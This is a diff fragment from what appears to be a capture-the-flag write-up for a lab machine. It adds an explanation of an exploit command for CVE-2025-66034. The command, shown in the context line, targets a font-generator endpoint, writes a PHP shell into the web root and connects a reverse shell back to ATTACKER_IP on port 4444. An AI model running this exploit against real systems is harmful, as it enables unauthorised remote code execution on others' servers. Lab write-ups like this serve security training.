@@ -1351,6 +1351,14 @@ if __name__ == "__main__":
 ![[Pasted image 20260322183239.png]]
 
 **Command:** `python3 varlib_cve_2025_66034.py --ip ATTACKER_IP --port 4444 --url http://variatype.htb/tools/variable-font-generator/process --path /var/www/variatype.htb --trigger http://variatype.htb`
+
+**Breakdown:**
+
+> - **python3**: The interpreter used to run the exploit.
+> - **--ip / --port**: Specifies the attacker’s machine where the shell will connect.
+> - **--path**: Defines the destination on the server's filesystem for the PHP shell.
+> - **--trigger**: The URL the script will request to execute the newly written file.
+>
 <div align="center">
 <br>
 <br>
